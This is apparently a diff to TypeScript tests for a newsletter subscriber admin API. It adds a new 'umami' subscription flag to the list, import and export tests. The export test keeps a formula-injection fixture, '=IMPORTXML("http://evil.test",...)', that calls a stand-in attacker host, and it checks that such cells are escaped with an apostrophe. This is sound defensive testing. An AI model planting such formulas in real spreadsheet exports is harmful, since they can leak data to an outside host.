@@ -66,6 +66,7 @@ async function signInAs(email: string) {
     subscribedPostcard: false,
     subscribedContraption: false,
     subscribedWorkshop: false,
+    subscribedUmami: false,
     subscribedTsundoku: false,
     source: null,
     sessionVersion: 1,
@@ -79,7 +80,10 @@ async function signInAs(email: string) {
 const signInAsAdmin = () => signInAs('admin@example.com')
 
 async function seedSubscriber(values: NewSubscriber) {
-  const [row] = await db.insert(subscribers).values(values).returning()
+  const [row] = await db
+    .insert(subscribers)
+    .values({ subscribedUmami: true, ...values })
+    .returning()
   return row
 }
 
@@ -156,6 +160,7 @@ describe('GET list', () => {
       subscribedPostcard: true,
       subscribedContraption: true,
       subscribedWorkshop: true,
+      subscribedUmami: true,
       source: 'https://news.ycombinator.com',
     })
     expect(alice.uuid).toMatch(/^[0-9a-f-]{36}$/)
@@ -212,6 +217,24 @@ describe('GET list', () => {
     ).json()
     expect(searched.total).toBe(1)
     expect(searched.rows[0].email).toBe('tsundoku@example.com')
+  })
+
+  it('filters the new Umami subscription independently', async () => {
+    await signInAsAdmin()
+    await seedSubscriber({
+      email: 'umami@example.com',
+      subscribedUmami: true,
+    })
+    await seedSubscriber({
+      email: 'not-umami@example.com',
+      subscribedUmami: false,
+    })
+
+    const filtered = await (
+      await listGet(listRequest('?newsletter=umami'))
+    ).json()
+    expect(filtered.total).toBe(1)
+    expect(filtered.rows[0].email).toBe('umami@example.com')
   })
 
   it('rejects an invalid newsletter filter', async () => {
@@ -347,6 +370,7 @@ describe('POST import', () => {
       expect(row.subscribedPostcard).toBe(true)
       expect(row.subscribedContraption).toBe(true)
       expect(row.subscribedWorkshop).toBe(true)
+      expect(row.subscribedUmami).toBe(true)
       expect(row.subscribedTsundoku).toBe(false)
       expect(row.confirmedAt).not.toBeNull()
       expect(row.source).toBe('csv_import')
@@ -364,6 +388,7 @@ describe('POST import', () => {
     expect(subscriber.subscribedPostcard).toBe(true)
     expect(subscriber.subscribedContraption).toBe(true)
     expect(subscriber.subscribedWorkshop).toBe(true)
+    expect(subscriber.subscribedUmami).toBe(true)
     expect(subscriber.subscribedTsundoku).toBe(false)
   })
 
@@ -390,6 +415,7 @@ describe('POST import', () => {
     expect(a.subscribedWorkshop).toBe(false) // opt-out preserved
     expect(a.subscribedPostcard).toBe(true)
     expect(a.subscribedContraption).toBe(true)
+    expect(a.subscribedUmami).toBe(true)
     expect(a.subscribedTsundoku).toBe(false)
   })
 
@@ -400,14 +426,15 @@ describe('POST import', () => {
       subscribedPostcard: false,
       subscribedContraption: true,
       subscribedWorkshop: false,
+      subscribedUmami: false,
       subscribedTsundoku: false,
       confirmedAt: new Date(),
     })
 
     const res = await importPost(
       importRequest(
-        'email,name,postcard,contraption,workshop,tsundoku,confirmed\n' +
-          'a@example.com,Alice,true,false,yes,1,1\n'
+        'email,name,postcard,contraption,workshop,umami,tsundoku,confirmed\n' +
+          'a@example.com,Alice,true,false,yes,true,1,1\n'
       )
     )
     expect(await res.json()).toEqual({
@@ -422,6 +449,7 @@ describe('POST import', () => {
     expect(a.subscribedPostcard).toBe(true)
     expect(a.subscribedContraption).toBe(false)
     expect(a.subscribedWorkshop).toBe(true)
+    expect(a.subscribedUmami).toBe(true)
     expect(a.subscribedTsundoku).toBe(false)
     expect(a.confirmedAt).not.toBeNull()
   })
@@ -589,6 +617,7 @@ describe('GET export', () => {
       'postcard',
       'contraption',
       'workshop',
+      'umami',
       'tsundoku',
       'confirmed',
       'source',
@@ -601,24 +630,25 @@ describe('GET export', () => {
     expect(data[0][0]).toBe('plain@example.com')
     expect(data[0][1]).toBe('Plain Name')
     expect(data[0][2]).toBe('false')
-    expect(data[0][6]).toBe('false')
-    expect(data[0][7]).toBe('https://example.org/')
+    expect(data[0][5]).toBe('true')
+    expect(data[0][7]).toBe('false')
+    expect(data[0][8]).toBe('https://example.org/')
 
     // Untrusted cells starting with '=' get a leading apostrophe — source is
     // attacker-influenced (it comes from document.referrer).
     expect(data[1][0]).toBe("'=cmd@example.com")
     expect(data[1][1]).toBe("'=SUM(A1:A2)")
-    expect(data[1][6]).toBe('true')
-    expect(data[1][7]).toBe(`'=IMPORTXML("http://evil.test","//a")`)
+    expect(data[1][7]).toBe('true')
+    expect(data[1][8]).toBe(`'=IMPORTXML("http://evil.test","//a")`)
   })
 
   it('import -> export -> import round-trip preserves flags and sources without creating rows', async () => {
     await signInAsAdmin()
     await importPost(
       importRequest(
-        'email,name,postcard,contraption,workshop,tsundoku,confirmed,source\n' +
-          'rt1@example.com,One,true,false,true,true,true,https://example.org/\n' +
-          'rt2@example.com,,false,true,false,false,false,\n'
+        'email,name,postcard,contraption,workshop,umami,tsundoku,confirmed,source\n' +
+          'rt1@example.com,One,true,false,true,false,true,true,https://example.org/\n' +
+          'rt2@example.com,,false,true,false,true,false,false,\n'
       )
     )
 
@@ -636,6 +666,7 @@ describe('GET export', () => {
     expect(rt1.subscribedPostcard).toBe(true)
     expect(rt1.subscribedContraption).toBe(false)
     expect(rt1.subscribedWorkshop).toBe(true)
+    expect(rt1.subscribedUmami).toBe(false)
     expect(rt1.subscribedTsundoku).toBe(false)
     expect(rt1.confirmedAt).not.toBeNull()
     expect(rt1.source).toBe('https://example.org/')
@@ -645,6 +676,7 @@ describe('GET export', () => {
     expect(rt2.subscribedPostcard).toBe(false)
     expect(rt2.subscribedContraption).toBe(true)
     expect(rt2.subscribedWorkshop).toBe(false)
+    expect(rt2.subscribedUmami).toBe(true)
     expect(rt2.subscribedTsundoku).toBe(false)
     expect(rt2.confirmedAt).toBeNull()
     expect(rt2.source).toBe('csv_import')
